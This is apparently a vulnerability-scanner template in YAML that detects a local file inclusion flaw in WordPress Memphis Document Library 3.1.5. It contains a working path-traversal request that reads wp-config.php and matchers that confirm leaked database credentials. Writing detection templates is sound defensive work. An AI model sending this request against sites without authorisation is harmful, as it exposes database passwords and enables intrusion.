id: "wp-memphis-documents-library-lfi"
name: "WordPress Memphis Document Library 3.1.5 - Local File Inclusion"
severity: "high"
description: "WordPress Memphis Document Library 3.1.5 is vulnerable to local file inclusion."
tech:
  - "wordpress"
  - "php"
tags:
  - "wpscan"
  - "wordpress"
  - "wp-plugin"
  - "lfi"
  - "edb"
  - "vuln"
cwe: "CWE-22"
reference: "https://www.exploit-db.com/exploits/39593"
spaExclusion: true
request:
  method: "GET"
  path: "/mdocs-posts/?mdocs-img-preview=../../../wp-config.php"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "word"
    part: "body"
    words:
      - "DB_NAME"
      - "DB_PASSWORD"
    condition: "and"
  - type: "status"
    status:
      - 200
